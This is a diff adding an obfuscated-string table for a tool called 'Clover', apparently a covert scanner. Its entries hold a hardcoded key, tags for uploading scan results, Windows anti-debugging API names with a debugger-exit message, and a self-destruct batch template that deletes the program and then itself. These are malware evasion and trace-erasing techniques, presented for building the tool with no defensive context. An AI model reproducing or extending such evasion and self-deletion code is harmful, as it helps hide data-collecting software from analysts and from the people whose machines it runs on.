@@ -1,0 +1,26 @@
+# Clover obfuscated strings. Run: go run cmd/genobf/main.go
+# Format: NAME=plaintext-value
+
+CONFIG_MARKER=xK9pL2mQ5vX8wR4t
+CONFIG_KEY_B64=tiEJNrFlRv0/Ood4hcOifIU2AJ13BVwvtC3wgqDg1Mc=
+CONTENT_TYPE=Content-Type
+APP_JSON=application/json
+POST=POST
+CONFIG_FILE=config.clover
+JSON_PREFIX=scan_results_
+JSON_SUFFIX=.json
+CLOVER_TAG=[CLOVER]
+UPLOAD_TAG=[UPLOAD]
+DEBUG_MSG=Debugger detected. Exiting.
+SELF_DESTRUCT_MSG=Scan complete. Self-destructing...
+KERNEL32=kernel32.dll
+NTDLL=ntdll.dll
+IS_DEBUGGER_PRESENT=IsDebuggerPresent
+CHECK_REMOTE_DEBUGGER=CheckRemoteDebuggerPresent
+GET_CURRENT_PROCESS=GetCurrentProcess
+NT_QUERY_INFO_PROCESS=NtQueryInformationProcess
+CMD=cmd
+CMD_C=/c
+BAT_PREFIX=sd_*.bat
+PING_WAIT=ping 127.0.0.1 -n 3 >nul
+DEL_FMT=@echo off\n%s\ndel /f "%s"\ndel /f "%%~f0"\n
